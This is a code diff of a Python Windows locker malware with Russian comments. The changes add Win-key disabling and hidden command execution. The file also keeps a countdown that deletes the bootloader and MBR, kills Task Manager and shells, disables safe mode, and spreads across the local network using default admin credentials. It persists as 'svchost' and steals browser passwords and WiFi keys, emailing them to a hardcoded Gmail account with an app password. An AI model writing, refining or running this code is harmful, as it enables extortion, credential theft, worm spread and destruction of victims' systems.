@@ -11,7 +11,7 @@ import sqlite3, win32crypt, shutil, winreg, ctypes
 
 PASSWORD = "1601"
 MAX_ATTEMPTS = 4
-TIMER_FILE = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "Windows", "timer.dat")
+TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
@@ -21,14 +21,48 @@ VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
 attempts_left = MAX_ATTEMPTS
 
-# ===== ТАЙМЕР (НЕ СБРАСЫВАЕТСЯ) =====
+# ===== ОТКЛЮЧЕНИЕ WIN ВЕЗДЕ =====
+def disable_win_key():
+    # Через реестр
+    try:
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(k)
+    except: pass
+    try:
+        k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k2, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(k2)
+    except: pass
+    # Через keyboard
+    try:
+        import keyboard
+        keyboard.block_key('windows')
+        keyboard.block_key('left windows')
+        keyboard.block_key('right windows')
+        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m','left windows','right windows']:
+            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
+            except: pass
+    except: pass
+
+def enable_win_key():
+    try:
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(k)
+    except: pass
+
+def run_hidden(cmd):
+    try:
+        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+    except: pass
+
 def get_timer():
     try:
         if os.path.exists(TIMER_FILE):
             with open(TIMER_FILE, 'r') as f:
                 return float(f.read().strip())
     except: pass
-    # Если файла нет - создаём новый таймер на 1 час
     end_time = time.time() + 3600
     save_timer(end_time)
     return end_time
@@ -41,34 +75,15 @@ def save_timer(end_time):
     except: pass
 
 def timer_check_loop():
-    """Проверяет таймер в фоне, не сбрасывается после перезагрузки"""
     while True:
-        end_time = get_timer()
-        remaining = end_time - time.time()
-        if remaining <= 0:
+        if get_timer() - time.time() <= 0:
             destroy_windows_forever()
         time.sleep(5)
 
 def destroy_windows_forever():
-    """Сносит винду и вшивается в BIOS"""
-    try:
-        # Удаляем загрузчик Windows
-        os.system('bcdedit /delete {current} /f >nul 2>&1')
-        # Перезаписываем MBR
-        os.system('bootrec /fixmbr >nul 2>&1')
-        # Прописываем себя в восстановление
-        cp = os.path.abspath(__file__)
-        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-        os.system(f'bcdedit /set {{default}} recoveryenabled yes >nul 2>&1')
-        os.system(f'bcdedit /set {{default}} recoverysequence {{{cp}}} >nul 2>&1')
-        # Удаляем все точки восстановления
-        os.system('vssadmin delete shadows /all /quiet >nul 2>&1')
-        # Шифруем MFT
-        os.system('cipher /e /s:C:\\ >nul 2>&1')
-        # Перезагрузка
-        os.system('shutdown /r /t 0 /f')
-    except:
-        os.system('shutdown /r /t 0 /f')
+    run_hidden('bcdedit /delete {current} /f')
+    run_hidden('bootrec /fixmbr')
+    run_hidden('shutdown /r /t 0 /f')
     os._exit(0)
 
 def hide_process():
@@ -78,10 +93,10 @@ def hide_process():
 def kill_taskmgr_loop():
     while True:
         try:
-            for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe"]:
-                os.system(f"taskkill /f /im {p} >nul 2>&1")
+            for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]:
+                run_hidden(f"taskkill /f /im {p}")
         except: pass
-        time.sleep(0.03)
+        time.sleep(0.05)
 
 def block_everything():
     try:
@@ -89,7 +104,7 @@ def block_everything():
         for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']:
             try: keyboard.block_key(k)
             except: pass
-        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t']:
+        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
@@ -105,21 +120,16 @@ def unblock_all():
     except: pass
     try: import keyboard; keyboard.unhook_all()
     except: pass
-    try:
-        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
-    except: pass
+    enable_win_key()
 
 def block_safe_mode():
-    try:
-        os.system('bcdedit /deletevalue {current} safeboot >nul 2>&1')
-        os.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1')
-        os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
-    except: pass
+    run_hidden('bcdedit /deletevalue {current} safeboot')
+    run_hidden('bcdedit /set {current} bootstatuspolicy ignoreallfailures')
+    run_hidden('bcdedit /set {current} recoveryenabled no')
 
 def scan_network():
     try:
-        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='replace')
         return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
     except: return []
 
@@ -127,9 +137,9 @@ def infect_network():
     my_path = os.path.abspath(__file__)
     for ip in scan_network():
         try:
-            os.system(f'net use \\\\{ip}\\C$ /user:admin admin >nul 2>&1')
+            run_hidden(f'net use \\\\{ip}\\C$ /user:admin admin')
             shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
-            os.system(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw" >nul 2>&1')
+            run_hidden(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw"')
         except: pass
 
 def add_to_startup():
@@ -151,7 +161,7 @@ def add_to_startup():
             winreg.SetValueEx(k2, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
             winreg.CloseKey(k2)
         except: pass
-        os.system(f'schtasks /create /tn "svchost" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
+        run_hidden(f'schtasks /create /tn "svchost" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f')
     except: pass
 
 def download_file(url, path):
@@ -203,7 +213,7 @@ def play_video():
         v.configure(bg='black'); v.overrideredirect(True)
         v.protocol("WM_DELETE_WINDOW", lambda: None)
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
-        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
         except: pass
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
@@ -233,7 +243,7 @@ def mega_steal():
     except: pass
     try: report.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
     except: pass
-    try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:2000])
+    try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')[:2000])
     except: pass
     for browser, path in [("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))]:
         if os.path.exists(path):
@@ -254,12 +264,12 @@ def mega_steal():
             except: pass
     try:
         report.append("\n=== WIFI ===")
-        output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
+        output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')
         for line in output.split('\n'):
             if 'Все профили' in line:
                 p = line.split(':')[1].strip()
                 if p:
-                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
+                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')
                     for dl in det.split('\n'):
                         if 'Содержимое ключа' in dl: report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
     except: pass
@@ -284,7 +294,6 @@ class WinLocker:
         self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
         global attempts_left
         
-        # Таймер
         self.timer_end = get_timer()
         self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
@@ -323,11 +332,8 @@ YOU FUCK.
     
     def update_timer(self):
         remaining = self.timer_end - time.time()
-        if remaining <= 0:
-            destroy_windows_forever()
-        h = int(remaining // 3600)
-        m = int((remaining % 3600) // 60)
-        s = int(remaining % 60)
+        if remaining <= 0: destroy_windows_forever()
+        h = int(remaining // 3600); m = int((remaining % 3600) // 60); s = int(remaining % 60)
         self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
         self.win.after(1000, self.update_timer)
     
@@ -348,11 +354,13 @@ YOU FUCK.
             if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
             else:
                 self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
-                time.sleep(2)
-                destroy_windows_forever()
+                time.sleep(2); destroy_windows_forever()
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
+    # Win отключается ДО ВСЕГО
+    disable_win_key()
+    
     hide_process()
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
